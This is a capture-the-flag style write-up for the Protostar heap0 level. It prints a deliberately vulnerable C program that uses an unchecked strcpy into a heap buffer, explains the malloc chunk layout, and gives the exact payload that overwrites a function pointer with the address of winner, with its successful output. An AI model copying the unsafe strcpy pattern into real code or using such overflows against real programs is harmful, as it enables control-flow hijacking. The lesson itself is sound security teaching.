### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

void winner()
{
  printf("level passed\n");
}

void nowinner()
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);
  
  f->fp();

}
```

### Solution 

Here we have two structures:

 - `data` which contains a 64 bytes long array called `name`
 - `fp` which contains a function pointer called `fp`

In the `main` function, we have two calls to `malloc` allocating memory for the two strutures.
The vulnerability lies in the call to `strcpy` that can be used to overwrite the value of `f->fp` with the address of `winner`. For more information about heap exploitation you can check out [this paper](https://www.blackhat.com/presentations/bh-usa-07/Ferguson/Whitepaper/bh-usa-07-ferguson-WP.pdf) [1].

The two chunks are most likely following each other and since both of them are allocated, it means 8 bytes seperates them from each other.
> These 8 bytes represents the fields `prev_size` and `size` of the `malloc_chunk` structure.

Thus, to exploit the vulnerability, we are going to provide a string starting with 64 times the character `A` to fill the buffer `d->name`, followed by 8 `B` to overwrite the `prev_size` and `size` fields of the `malloc_chunk` structure and finally the address of `winner`.

The address of winner is `0x08048464`.

```
user@protostar:/tmp$ objdump -t /opt/protostar/bin/heap0 | grep winner
08048464 g     F .text 	00000014              winner
```

And that's how we flag the first heap buffer overflow.

```
user@protostar:/tmp$ heap0 $(python -c "print 'A'*64 + 'B'*8 + '\x64\x84\x04\x08'")
data is at 0x804a008, fp is at 0x804a050
level passed
```
